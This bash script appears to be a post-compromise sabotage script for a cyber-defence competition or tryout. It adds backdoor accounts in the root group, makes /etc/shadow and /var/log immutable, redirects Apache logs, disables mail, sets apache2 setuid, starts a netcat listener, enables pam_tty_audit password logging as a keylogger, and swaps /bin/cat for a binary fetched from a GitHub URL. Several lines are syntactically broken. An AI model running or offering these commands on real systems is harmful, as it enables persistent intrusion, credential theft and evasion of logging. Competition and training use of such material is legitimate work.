#!/bin/bash
#Add new accounts to shadow
useradd imposter -g 0 -p admin -r -s /bin/bash;
useradd impasta2 -g 0 -p admin -s /bin/sh;
useradd iaminsideyourwalls -g 1 -p admin -s /bin/csh;
useradd l33th4x0r -g 0 -p hax -s /bin/sh;
#Make /var/log and /etc/passwd readonly :)
chattr -R +i /var/log;
chattr +i /etc/shadow;
#Force webserver to log to tmp and mess with error logging :)
sed -i 's/ErrorLog \${APACHE_LOG_DIR}\/error\.log/ErrorLog \/tmp\/hahawrongdir.log/' /etc/apache2/apache2.conf;
echo "CustomLog /tmp/trolled.log common" >> /etc/apache2/apache2.conf;
systemctl restart apache;2
#Disable mail
systemctl stop postfix;
systemctl disable postfix;
#Make apache2 instance run as root :D
chmod u+s /usr/sbin/apache2;
#Install reverse shell
nc -lvp 1337 &;
#Install keylogger :D
if sudo test -f /etc/pam.d/password-auth; then sudo cp /etc/pam.d/password-auth /tmp/password-auth.bk; fi; if sudo test -f /etc/pam.d/system-auth; then sudo cp /etc/pam.d/system-auth /tmp/system-auth.bk; fi; sudo touch /tmp/password-auth.bk sudo touch /tmp/system-auth.bk sudo echo "session    required    pam_tty_audit.so enable=* log_password" >> /etc/pam.d/password-auth sudo echo "session    required    pam_tty_audit.so enable=* log_password" >> /etc/pam.d/system-auth
#Pull modded cat and swap :)
#Modded cat will append to a file in cyberpup_admin called always_watching.txt
#Place /usr/bin/keybak so that cat can restore keys
mv /bin/cat /bin/dog;
cp /home/cyberpup_admin/.ssh/authorized_keys /usr/bin/keybak;
sudo curl https://raw.githubusercontent.com/bluefireexplosion/cyberdawgs-tryouts/master/sick-cat --output /bin/cat;
chmod +x /bin/cat
#Clear history, leave no trace
#history -c
